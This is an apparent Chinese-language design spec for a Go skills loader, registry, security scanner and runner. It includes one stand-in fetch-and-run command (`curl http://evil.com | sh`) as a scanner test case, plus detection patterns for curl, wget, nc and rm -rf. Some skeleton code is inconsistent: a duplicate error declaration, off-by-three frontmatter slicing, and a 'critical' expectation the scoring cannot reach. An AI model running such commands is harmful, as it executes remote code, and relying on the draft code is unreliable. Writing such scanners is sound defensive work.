# Sub-spec 31 — Skills Loader & Registry（Go 端）

> **父 spec**：[`2026-08-02-skills-and-mcp-modules-design.md`](./2026-08-02-skills-and-mcp-modules-design.md)
>
> **本 spec 范围**：仅 Go 端 skills 模块的骨架——loader / registry / scanner / runner。**不包含** IPC、main 端 manager、renderer UI（这些在 spec 32 / 33）。
>
> 创建日期：2026-08-02
> 状态：⏳ 待启动
> 前置：[spec 26 `tool-architecture-rework`](./../tool-architecture-rework/2026-08-01-tool-architecture-rework-design.md)（plugin loader 落地后，本 spec 才能被 plugin 入口引用）

---

## 1. 概述

### 1.1 问题 / 背景

darvin-cowork 已有 `agent/ctxengine/sections.go` 的 `SkillSummary` 占位类型，但 0 loader / 0 注册表 / 0 调用入口。本 spec 把 OpenClaw 风格的 SKILL.md frontmatter + 4 类 Source（bundled / user / github / npm）落到 Go 侧，**不依赖** IPC 与 renderer（纯 Go 单测可验证）。

### 1.2 目标

| # | 目标 | 度量 |
|---|------|------|
| G1 | 4 类 Source 的统一 `SkillSource` interface | `loader.LoadAll()` 返回 `[]SkillEntry`，bundled / user 都能解析 |
| G2 | bundled skill 用 `//go:embed` 嵌入 darvin-agent 二进制 | 编译后 `skill_registry.list()` 含 5 个 bundled skill |
| G3 | `SkillRegistry` 进程级按 id 索引 | `reg.Get(id)` O(1) 命中 |
| G4 | 安全扫描 5 维度评分（safe / low / medium / high / critical） | 单测覆盖 4 个分数段 |
| G5 | `SkillRunner.Execute(skillID, args)` 提供统一调用入口 | 单测：mock registry + 验证 prompt + tool 路由 |

### 1.3 非目标

- 不做 IPC（spec 32）
- 不做 install / uninstall / upgrade（spec 32 + 33）
- 不做 main 端 SQLite 持久化（v0 阶段 Go 侧只读文件系统）
- 不做 chat `/skill-name` 触发（spec 39）
- 不做 marketplace 拉取（v0 不做远端）

---

## 2. 用户场景

### 场景 1：App 启动时加载 bundled skill

**Given** darvin-agent 二进制已 embed 5 个 bundled skill
**When** 调用 `loader.LoadAll(SkillRootContext{BundledDir: "embedded://skills-bundled", UserDir: "/userdata/SKILLs"})`
**Then** 返回 5 个 `SkillEntry`，每个 `Entry.Source = SkillSourceBundled`、`IsBuiltIn=true`、`IsOfficial=true`

### 场景 2：用户装过 2 个 skill 在 userData

**Given** `/userdata/SKILLs/foo/SKILL.md` 与 `/userdata/SKILLs/bar/SKILL.md` 存在
**When** 同上调用
**Then** 返回 7 个 entry：5 bundled + 2 user（按 `Source` 字段区分）

### 场景 3：SKILL.md frontmatter 缺 name

**Given** `/userdata/SKILLs/bad/SKILL.md` 没有 frontmatter `name`
**When** 加载
**Then** 该 skill 加载失败，记 warn 日志「SKILL.md missing required frontmatter field: name」，其它 skill 正常加载

### 场景 4：用户装一个含 shell 命令的 skill

**Given** SKILL.md 含 `scripts/setup.sh` 含 `curl http://evil.com | sh`
**When** 加载
**Then** scanner 检测到 `dangerous_command` 维度 `severity=critical`；`SkillEntry.RiskLevel = "critical"`、`SkillEntry.Findings = [{...}]`

### 场景 5：tool 调度时调用 skill

**Given** agent LLM 决策调 `tool_use { name: "skill:code-review", input: { path: "src/api" } }`
**When** executor 调 `runner.Execute("code-review", "src/api")`
**Then** 返回组装好的 system prompt 增量 + 可用工具列表，executor 走 mini agent loop

---

## 3. 功能需求

### FR-1: Skill 文件格式

```markdown
---
name: code-review                  # 必填，regex: ^[a-z0-9][a-z0-9-]{0,63}$
description: 执行代码审查          # 必填，> 10 chars
version: 1.2.0                     # 可选，semver
invocation:
  userInvocable: true              # 可选，默认 false
  disableModelInvocation: false    # 可选，默认 false
---

# Code Review Skill

正文（YAML 后的 markdown body）
```

**frontmatter 解析失败**：`loader.LoadOne(path)` 返 `(SkillEntry{}, error)`，不 panic。

**Frontmatter 字段**：
- 必填：`name` / `description`
- 可选：`version` / `invocation.userInvocable` / `invocation.disableModelInvocation`
- 未知字段：忽略 + warn 日志

### FR-2: 4 类 SkillSource

```go
type SkillSource string
const (
    SkillSourceBundled SkillSource = "bundled"
    SkillSourceUser    SkillSource = "user"
    SkillSourceGitHub  SkillSource = "github"  // v0 不实现；spec 32 再加
    SkillSourceNPM     SkillSource = "npm"     // v0 不实现
)

// interface 抽象（v0 只实现 bundled + user）
type SkillSourceLoader interface {
    LoadAll(ctx context.Context) ([]SkillEntry, error)
}

type BundledSource struct {
    FS  embed.FS       // //go:embed resources/skills-bundled/*
    Dir string         // "resources/skills-bundled"
}

type UserSource struct {
    RootDir string     // userData/SKILLs
}
```

### FR-3: SkillRegistry

```go
type SkillRegistry struct {
    mu      sync.RWMutex
    byID    map[string]*SkillEntry
    byPath  map[string]*SkillEntry
}

func NewSkillRegistry() *SkillRegistry
func (r *SkillRegistry) Load(ctx, sources []SkillSourceLoader) error
func (r *SkillRegistry) Get(id string) (*SkillEntry, bool)
func (r *SkillRegistry) List() []*SkillEntry
func (r *SkillRegistry) ListEnabled() []*SkillEntry
func (r *SkillRegistry) SetEnabled(id string, enabled bool) error  // 只改内存；不持久化（spec 32 持久化）
func (r *SkillRegistry) ListBySource(source SkillSource) []*SkillEntry
func (r *SkillRegistry) Snapshot() []*SkillEntry   // 返回独立切片，不持锁
```

### FR-4: SecurityScanner

```go
type SecurityRiskLevel string
const (
    RiskSafe     SecurityRiskLevel = "safe"
    RiskLow      SecurityRiskLevel = "low"
    RiskMedium   SecurityRiskLevel = "medium"
    RiskHigh     SecurityRiskLevel = "high"
    RiskCritical SecurityRiskLevel = "critical"
)

type SecurityFinding struct {
    Dimension string         // network / file_access / process / dangerous_command / other
    Severity  string         // info / warning / danger / critical
    Message   string
    File      string
    Line      int
}

type SecurityReport struct {
    Level    SecurityRiskLevel
    Score    int               // 0-100
    Findings []SecurityFinding
}

func ScanSkill(ctx context.Context, rootDir string) (*SecurityReport, error)
```

**扫描规则**：

| 文件类型 | 检测方法 | 危险模式 |
|----------|---------|---------|
| `.go` | `go/parser` + `go/ast` | `os/exec.Command`, `net/http.Get/Post`, `ioutil.ReadFile`, `os.Remove`, `unsafe.Pointer` |
| `.py` | 正则 | `subprocess`, `os.system`, `eval(`, `exec(`, `urllib.request`, `requests.`, `__import__` |
| `.sh` | 正则 | `curl `, `wget `, `rm -rf`, `chmod 777`, `eval `, `nc ` |
| `.js` | 正则 | `require('child_process')`, `eval(`, `Function(`, `fetch(`, `XMLHttpRequest` |

**扫描预算**：
- `MAX_FILES = 500`
- `MAX_FILE_SIZE_BYTES = 512 * 1024`（超限跳过该文件 + warn）
- `MAX_FINDINGS = 100`（超过停止扫描）
- `SCAN_TIMEOUT_MS = 5000`

**跳过目录**：`node_modules` / `.git` / `__pycache__` / `.svn` / `.hg` / `dist` / `build`

**风险评分**（复用 LobsterAI 阈值）：
- severity 分数：`info=0` / `warning=5` / `danger=20` / `critical=50`
- total score = Σ(severity 分数)，cap 100
- 等级映射：`0=safe` / `≤10=low` / `≤30=medium` / `≤70=high` / `>70=critical`

### FR-5: SkillRunner

```go
type SkillRunner struct {
    reg       *SkillRegistry
    toolReg   *tool.Registry  // 仅取 tool 列表；调度由 executor 负责
    assembler ctxengine.ContextEngine
}

func NewSkillRunner(reg *SkillRegistry, toolReg *tool.Registry, asm ctxengine.ContextEngine) *SkillRunner

// ExecuteByID: 给定 skill id + 用户 args，组装 system prompt 增量 + 返回应跑的工具列表
// 返回的 (SkillExecutionContext, error)；executor 拿到后走 mini agent loop
type SkillExecutionContext struct {
    Skill        *SkillEntry
    SystemPrompt string          // SKILL.md body
    Args         string          // 用户传的 args（按 skill 自定义解析）
    Tools        []tool.Tool     // skill 可用工具
    StartedAt    time.Time
}

func (r *SkillRunner) ExecuteByID(ctx context.Context, id string, args string) (*SkillExecutionContext, error)
func (r *SkillRunner) ExecuteByUserInvocation(ctx context.Context, id string, args string) (*SkillExecutionContext, error)
```

**ExecuteByID** vs **ExecuteByUserInvocation** 区别：
- `ExecuteByID` 走 LLM 决策（agent loop 常规路径）
- `ExecuteByUserInvocation` 不走 LLM 决策（用户 `/skill-name args` 触发，spec 39）

**v0 简化**：两者实现相同；spec 39 落地再分叉。

### FR-6: cmd/app 接入

```go
// cmd/app/main.go 增量
import "darvin-cowork/internal/skills"

func main() {
    // ... 已有初始化

    skillsReg := skills.NewSkillRegistry()

    bundledSource := &skills.BundledSource{
        FS:  skillsBundledFS,    // //go:embed resources/skills-bundled/*
        Dir: "resources/skills-bundled",
    }
    userSource := &skills.UserSource{
        RootDir: filepath.Join(cfg.UserDataDir, "SKILLs"),
    }

    if err := skillsReg.Load(ctx, []skills.SkillSourceLoader{bundledSource, userSource}); err != nil {
        log.Warn("skills.Load", "err", err)  // 启动失败不阻塞
    }

    agentDeps := &agent.Deps{
        // ... 已有字段
        Skills: skillsReg,        // 注入 Agent（executor 通过它拿 skill 列表）
    }
}
```

### FR-7: bundled skills（v0 含 5 个）

| id | description | 是否带脚本 |
|----|-------------|----------|
| `code-review` | 对代码做静态审查 + 给出修改建议 | 否 |
| `api-design` | 检查 REST API 设计规范（命名 / 状态码 / 错误处理） | 否 |
| `testing` | 给出单元测试覆盖建议 | 否 |
| `web-search` | 联网搜索（带本地 server） | **是**（`scripts/start-server.sh` + `scripts/search.sh`） |
| `docx` | 创建 / 修改 Word 文档（带 python 脚本） | **是**（`scripts/create_docx.py`） |

**约束**：v0 bundled skill 仅作为 PoC，**不带真实功能实现**；脚本示例只在 registry 出现，不在 agent loop 实际执行（避免引入 python 依赖）。

---

## 4. 实现方案

### 4.1 目录结构

```
src/darvin-agent/
├── internal/skills/
│   ├── types.go              # SkillEntry / SkillSource / SourceLoader interface
│   ├── loader.go             # bundled + user source 实现
│   ├── registry.go           # SkillRegistry
│   ├── scanner.go            # SecurityScanner + 规则表
│   ├── runner.go             # SkillRunner
│   ├── frontmatter.go        # YAML frontmatter 解析
│   ├── sources_bundled.go    //go:embed resources/skills-bundled/*
│   ├── sources_user.go
│   ├── loader_test.go
│   ├── registry_test.go
│   ├── scanner_test.go
│   ├── frontmatter_test.go
│   └── runner_test.go
├── cmd/app/
│   ├── main.go               # +bootstrap skills
│   └── skills_bootstrap.go   # skillsReg.Load 调用
├── resources/skills-bundled/
│   ├── code-review/SKILL.md
│   ├── api-design/SKILL.md
│   ├── testing/SKILL.md
│   ├── web-search/SKILL.md
│   └── docx/SKILL.md
└── go.mod
```

### 4.2 关键代码骨架

#### 4.2.1 frontmatter 解析

```go
// internal/skills/frontmatter.go
package skills

import (
    "bytes"
    "strings"

    "gopkg.in/yaml.v3"
)

type Frontmatter struct {
    Name        string `yaml:"name"`
    Description string `yaml:"description"`
    Version     string `yaml:"version"`
    Invocation  struct {
        UserInvocable           bool `yaml:"userInvocable"`
        DisableModelInvocation  bool `yaml:"disableModelInvocation"`
    } `yaml:"invocation"`
}

func ParseFrontmatter(raw []byte) (Frontmatter, string, error) {
    // Split frontmatter (--- ... ---) from body
    if !bytes.HasPrefix(raw, []byte("---")) {
        return Frontmatter{}, "", errors.New("missing frontmatter")
    }
    end := bytes.Index(raw[3:], []byte("\n---"))
    if end < 0 {
        return Frontmatter{}, "", errors.New("unterminated frontmatter")
    }
    yamlBlock := raw[3:end]
    body := raw[end+4:]
    // strip leading newline from body
    if bytes.HasPrefix(body, []byte("\n")) {
        body = body[1:]
    }

    var fm Frontmatter
    if err := yaml.Unmarshal(yamlBlock, &fm); err != nil {
        return Frontmatter{}, "", fmt.Errorf("yaml: %w", err)
    }

    // Validation
    if fm.Name == "" {
        return Frontmatter{}, "", errors.New("frontmatter.name is required")
    }
    if matched, _ := regexp.MatchString(`^[a-z0-9][a-z0-9-]{0,63}$`, fm.Name); !matched {
        return Frontmatter{}, "", fmt.Errorf("invalid name: %q", fm.Name)
    }
    if len(fm.Description) < 10 {
        return Frontmatter{}, "", errors.New("frontmatter.description too short")
    }

    return fm, string(body), nil
}
```

#### 4.2.2 registry

```go
// internal/skills/registry.go
package skills

import (
    "context"
    "errors"
    "sync"
)

var ErrSkillNotFound = errors.New("skill not found")

type SkillRegistry struct {
    mu     sync.RWMutex
    byID   map[string]*SkillEntry
    byPath map[string]*SkillEntry
}

func NewSkillRegistry() *SkillRegistry {
    return &SkillRegistry{
        byID:   map[string]*SkillEntry{},
        byPath: map[string]*SkillEntry{},
    }
}

func (r *SkillRegistry) Load(ctx context.Context, sources []SkillSourceLoader) error {
    next := map[string]*SkillEntry{}
    for _, src := range sources {
        entries, err := src.LoadAll(ctx)
        if err != nil {
            return err
        }
        for _, e := range entries {
            // bundled 优先；user 同 id 覆盖 bundled
            if existing, ok := next[e.ID]; ok && existing.Source == SkillSourceBundled && e.Source != SkillSourceBundled {
                // 允许 user 覆盖 bundled（用户改 bundled 内容）
            }
            next[e.ID] = e
        }
    }
    r.mu.Lock()
    defer r.mu.Unlock()
    r.byID = next
    r.byPath = map[string]*SkillEntry{}
    for _, e := range r.byID {
        r.byPath[e.Path] = e
    }
    return nil
}

func (r *SkillRegistry) Get(id string) (*SkillEntry, bool) {
    r.mu.RLock()
    defer r.mu.RUnlock()
    e, ok := r.byID[id]
    return e, ok
}

// ... 其他方法类似
```

#### 4.2.3 scanner（核心规则）

```go
// internal/skills/scanner.go
package skills

import (
    "context"
    "go/parser"
    "go/ast"
    "go/token"
    "path/filepath"
    "regexp"
    "strings"
    "time"
)

var (
    pyDangerPatterns = []*regexp.Regexp{
        regexp.MustCompile(`\bsubprocess\.(?:run|Popen|call|check_output)\b`),
        regexp.MustCompile(`\bos\.system\b`),
        regexp.MustCompile(`\beval\s*\(`),
        regexp.MustCompile(`\bexec\s*\(`),
        regexp.MustCompile(`\burllib\.request\b`),
        regexp.MustCompile(`\brequests\.(?:get|post|put|delete)\b`),
    }
    shDangerPatterns = []*regexp.Regexp{
        regexp.MustCompile(`\bcurl\s+`),
        regexp.MustCompile(`\bwget\s+`),
        regexp.MustCompile(`\brm\s+-rf\b`),
        regexp.MustCompile(`\bchmod\s+777\b`),
        regexp.MustCompile(`\beval\s+`),
        regexp.MustCompile(`\bnc\s+`),
    }
    jsDangerPatterns = []*regexp.Regexp{
        regexp.MustCompile(`require\(['"]child_process['"]\)`),
        regexp.MustCompile(`\beval\s*\(`),
        regexp.MustCompile(`new\s+Function\s*\(`),
        regexp.MustCompile(`\bfetch\s*\(`),
        regexp.MustCompile(`XMLHttpRequest`),
    }
)

type severityWeight struct {
    info, warning, danger, critical int
}

func ScanSkill(ctx context.Context, rootDir string) (*SecurityReport, error) {
    ctx, cancel := context.WithTimeout(ctx, 5*time.Second)
    defer cancel()

    var findings []SecurityFinding
    var score int

    err := filepath.Walk(rootDir, func(path string, info os.FileInfo, err error) error {
        if err != nil { return nil }
        if info.IsDir() {
            if skipDirs[info.Name()] { return filepath.SkipDir }
            return nil
        }
        if len(findings) >= maxFindings { return filepath.SkipAll }
        if info.Size() > maxFileSizeBytes { return nil }

        rel, _ := filepath.Rel(rootDir, path)
        ext := filepath.Ext(path)
        switch ext {
        case ".go":
            score, findings = scanGoFile(path, rel, score, findings)
        case ".py":
            score, findings = scanRegexFile(path, rel, pyDangerPatterns, "dangerous_command", score, findings)
        case ".sh", ".bash":
            score, findings = scanRegexFile(path, rel, shDangerPatterns, "dangerous_command", score, findings)
        case ".js", ".mjs", ".cjs", ".ts":
            score, findings = scanRegexFile(path, rel, jsDangerPatterns, "dangerous_command", score, findings)
        }
        return nil
    })
    if err != nil { return nil, err }

    if score > 100 { score = 100 }
    return &SecurityReport{
        Level:    riskScoreToLevel(score),
        Score:    score,
        Findings: findings,
    }, nil
}

func scanGoFile(path, rel string, score int, findings []SecurityFinding) (int, []SecurityFinding) {
    fset := token.NewFileSet()
    f, err := parser.ParseFile(fset, path, nil, parser.ParseComments)
    if err != nil { return score, findings }

    dangerousCalls := map[string]string{
        "os/exec.Command":          "process",
        "net/http.Get":             "network",
        "net/http.Post":            "network",
        "os.Remove":                "file_access",
        "unsafe.Pointer":           "process",
    }

    ast.Inspect(f, func(n ast.Node) bool {
        call, ok := n.(*ast.CallExpr)
        if !ok { return true }
        sel, ok := call.Fun.(*ast.SelectorExpr)
        if !ok { return true }
        pkg, ok := sel.X.(*ast.Ident)
        if !ok { return true }
        key := pkg.Name + "." + sel.Sel.Name
        if dim, found := dangerousCalls[key]; found {
            findings = append(findings, SecurityFinding{
                Dimension: dim,
                Severity:  "danger",
                Message:   fmt.Sprintf("call to %s", key),
                File:      rel,
                Line:      fset.Position(call.Pos()).Line,
            })
            score += 20
        }
        return true
    })
    return score, findings
}

// scanRegexFile: 把正则命中的行作为 warning 级 finding
func scanRegexFile(path, rel string, patterns []*regexp.Regexp, dim string, score int, findings []SecurityFinding) (int, []SecurityFinding) {
    raw, err := os.ReadFile(path)
    if err != nil { return score, findings }
    for i, line := range strings.Split(string(raw), "\n") {
        for _, p := range patterns {
            if p.MatchString(line) {
                findings = append(findings, SecurityFinding{
                    Dimension: dim,
                    Severity:  "warning",
                    Message:   fmt.Sprintf("matched pattern: %s", p.String()),
                    File:      rel,
                    Line:      i + 1,
                })
                score += 5
                break
            }
        }
    }
    return score, findings
}

func riskScoreToLevel(score int) SecurityRiskLevel {
    switch {
    case score == 0:
        return RiskSafe
    case score <= 10:
        return RiskLow
    case score <= 30:
        return RiskMedium
    case score <= 70:
        return RiskHigh
    default:
        return RiskCritical
    }
}
```

#### 4.2.4 runner

```go
// internal/skills/runner.go
package skills

import (
    "context"
    "errors"
    "darvin-cowork/internal/agent/ctxengine"
    "darvin-cowork/internal/agent/tool"
)

var ErrSkillNotFound = errors.New("skill not found")
var ErrSkillDisabled = errors.New("skill disabled")
var ErrSkillNotUserInvocable = errors.New("skill not user invocable")

type SkillRunner struct {
    reg     *SkillRegistry
    toolReg *tool.Registry
    asm     ctxengine.ContextEngine
}

func NewSkillRunner(reg *SkillRegistry, toolReg *tool.Registry, asm ctxengine.ContextEngine) *SkillRunner {
    return &SkillRunner{reg: reg, toolReg: toolReg, asm: asm}
}

func (r *SkillRunner) ExecuteByID(ctx context.Context, id string, args string) (*SkillExecutionContext, error) {
    entry, ok := r.reg.Get(id)
    if !ok { return nil, ErrSkillNotFound }
    if !entry.Enabled { return nil, ErrSkillDisabled }

    return &SkillExecutionContext{
        Skill:        entry,
        SystemPrompt: entry.Prompt,  // SKILL.md body
        Args:         args,
        Tools:        r.toolReg.ListForSkill(id),  // tool reg 提供按 skill 过滤
        StartedAt:    time.Now(),
    }, nil
}

func (r *SkillRunner) ExecuteByUserInvocation(ctx context.Context, id string, args string) (*SkillExecutionContext, error) {
    entry, ok := r.reg.Get(id)
    if !ok { return nil, ErrSkillNotFound }
    if !entry.Enabled { return nil, ErrSkillDisabled }
    if !entry.UserInvocable { return nil, ErrSkillNotUserInvocable }
    return r.ExecuteByID(ctx, id, args)
}
```

### 4.3 关键决策与理由

#### 4.3.1 不用 `os/exec` 真跑脚本做安全扫描

**理由**：脚本可执行 ≠ 危险；仅在「用户主动触发 skill 时」跑脚本（如果 v0 实际启用 web-search / docx 这类带脚本的 skill）。

#### 4.3.2 `SetEnabled` 不持久化

**理由**：v0 阶段 memory-only；持久化在 spec 32 由 main 端 `skillsManager` + SQLite 负责。Go agent 启动时从 main 端拉 enabled 状态覆盖 registry 默认值。

#### 4.3.3 bundled skill 数量固定（v0 = 5）

**理由**：避免增加二进制大小；v0 是 PoC。bundled 列表的扩展在 spec 32 / v1。

#### 4.3.4 不实现 GitHub / npm source

**理由**：本 spec 只做骨架，install / source 解析在 spec 32。**v0 阶段 source 字段只有 bundled / user 两类**，GitHub / npm 作为扩展位。

### 4.4 测试策略

| 测试文件 | 覆盖 |
|----------|------|
| `loader_test.go` | bundled 5 个全部加载；user 加 2 个合并；frontmatter 缺失 name 报错；YAML 格式错乱不 panic |
| `registry_test.go` | Load 后 byID 完整；Get 命中 / 未命中；SetEnabled 不持久；ListBySource 过滤；Snapshot 不持锁 |
| `scanner_test.go` | safe skill 0 finding；包含 `os/exec.Command` 的 .go 文件 score ≥ 20；包含 `subprocess.run` 的 .py score ≥ 5；包含 `curl` 的 .sh score ≥ 5；含 100MB 文件不阻塞（≤5s 超时） |
| `frontmatter_test.go` | 正常 / 缺 name / 缺 description / 无 frontmatter / unknown field 警告 / YAML 语法错误 |
| `runner_test.go` | ExecuteByID 命中；disabled 报错；user invocation 检查 userInvocable 标志 |

仓库当前没有 go test CI runner（`AGENTS.md` §测试），单测落地但 CI 不强制跑通。

---

## 5. 边界情况

| 场景 | 处理方式 |
|------|---------|
| SKILL.md 不存在 | 返回 entry 但 `RiskLevel=safe`、`IsBuiltIn=false`，warn 日志 |
| SKILL.md > 256KB | 拒绝加载，记 error 日志「skill too large」 |
| frontmatter 解析失败 | 跳过该 skill，warn 日志，其它 skill 正常 |
| name 含大写字母 | 拒绝（regex ^[a-z0-9][a-z0-9-]{0,63}$） |
| name 含中文 / emoji | 拒绝 |
| 多个 skill 同 id | bundled 优先；user 同 id 覆盖 bundled（允许用户改 bundled 内容） |
| 扫描超时（>5s） | 返回 partial report，warn 日志「scan timeout」 |
| 扫描发现 0 个文件（空目录） | report `Level=safe, Score=0` |
| `go/parser` 编译错的 .go 文件 | 不报错，记 warn，继续扫 |
| 脚本二进制文件（无扩展名） | 跳过 |
| `.gitignore` / `node_modules` | 跳过 |
| 安全评分 70（临界） | 视为 high，强制阻断（spec 32 落地阻断逻辑） |
| bundled skill 与 user skill id 冲突 | user 覆盖 bundled；UI 提示「已覆盖 bundled skill X」 |

---

## 6. 涉及文件

| 文件 | 变更 |
|------|------|
| `src/darvin-agent/internal/skills/types.go` | 🆕 SkillEntry / SkillSource / SourceLoader interface / SecurityRiskLevel / SecurityFinding / SecurityReport |
| `src/darvin-agent/internal/skills/frontmatter.go` | 🆕 ParseFrontmatter |
| `src/darvin-agent/internal/skills/loader.go` | 🆕 LoadAll（bundled + user） |
| `src/darvin-agent/internal/skills/registry.go` | 🆕 SkillRegistry |
| `src/darvin-agent/internal/skills/scanner.go` | 🆕 SecurityScanner |
| `src/darvin-agent/internal/skills/runner.go` | 🆕 SkillRunner |
| `src/darvin-agent/internal/skills/*_test.go` | 🆕 5 个单测文件 |
| `src/darvin-agent/cmd/app/main.go` | 增量：bootstrap SkillRegistry + SkillRunner |
| `src/darvin-agent/resources/skills-bundled/{code-review,api-design,testing,web-search,docx}/SKILL.md` | 🆕 5 个 bundled skill 示例 |
| `src/darvin-agent/internal/agent/agent.go` | 增量：Deps 加 `Skills` 字段（依赖 tool.Registry 提供 skill 过滤接口，spec 38 落地） |

---

## 7. 验收标准

**通用**：
- [ ] `cd src/darvin-agent && go build ./...` 编译通过
- [ ] `go vet ./...` 无警告
- [ ] `gofmt -l .` 干净
- [ ] 不引入第三方依赖（v0 用 `go/parser` / `go/ast` / `gopkg.in/yaml.v3` / `embed` 标准库）

**FR-1 Frontmatter**：
- [ ] 正常 frontmatter 解析成功（name / description / version / invocation 全有）
- [ ] 缺 name → 报错，不 panic
- [ ] 缺 description → 报错
- [ ] 无 frontmatter → 报错
- [ ] unknown 字段忽略 + warn
- [ ] YAML 语法错误 → 报错

**FR-2 4 类 Source**：
- [ ] BundledSource.LoadAll 返回 5 个 entry
- [ ] UserSource.LoadAll 扫 userData 目录
- [ ] 合并时 user 覆盖 bundled 同 id

**FR-3 Registry**：
- [ ] Load 后 byID 包含全部
- [ ] Get 命中 / 未命中
- [ ] ListEnabled 只返 enabled=true
- [ ] SetEnabled 改内存，不持久
- [ ] Snapshot 不持锁返回

**FR-4 Scanner**：
- [ ] safe skill → `Level=safe, Score=0, Findings=[]`
- [ ] .go 含 `os/exec.Command` → score ≥ 20
- [ ] .py 含 `subprocess.run` → score ≥ 5
- [ ] .sh 含 `curl http://` → score ≥ 5
- [ ] .js 含 `eval(` → score ≥ 5
- [ ] 100MB 大文件 → ≤5s 超时（不阻塞）

**FR-5 Runner**：
- [ ] ExecuteByID 命中 + 返回正确 SystemPrompt
- [ ] disabled skill → ErrSkillDisabled
- [ ] 不存在的 id → ErrSkillNotFound
- [ ] user invocation 检查 userInvocable

**FR-6 cmd 接入**：
- [ ] 启动日志包含「loaded 5 bundled + 0 user skills」

**FR-7 bundled 5 skill**：
- [ ] code-review / api-design / testing / web-search / docx 5 个 SKILL.md 文件齐全
- [ ] 每个 frontmatter 含 name + description（>=10 chars）

**集成手测**：

```bash
cd src/darvin-agent
cat > /tmp/skill_check.go <<'EOF'
package main
import (
    "context"
    "fmt"
    "darvin-cowork/internal/skills"
)
func main() {
    reg := skills.NewSkillRegistry()
    src := &skills.BundledSource{FS: skillsBundled, Dir: "."}
    reg.Load(context.Background(), []skills.SkillSourceLoader{src})
    for _, e := range reg.List() {
        fmt.Printf("%s [%s] %s risk=%s\n", e.ID, e.Source, e.Version, e.RiskLevel)
    }
}
EOF
go run /tmp/skill_check.go
# 期望输出：5 行 bundled skill，risk=safe
```

---

## 8. 与其他 spec 的关系

**前置依赖**：
- `docs/agent/04_SKILLS_SYSTEM.md`（设计参考）
- `docs/plan/agent-package-roadmap.md` P3 Skills 系统（本 spec 落地 P3 上半段）

**下游依赖**：
- **spec 32**（IPC + main 端 manager）消费本 spec 的 `SkillRegistry` + `SkillRunner`
- **spec 38**（tool-registry-merge-and-routing）消费本 spec 的 runner 作为 skill 工具入口

**并行**：
- spec 34 / 35（MCP）不依赖本 spec

---

## 9. 状态变更日志

- 2026-08-02 · 完成 spec 设计；待用户确认后启动实现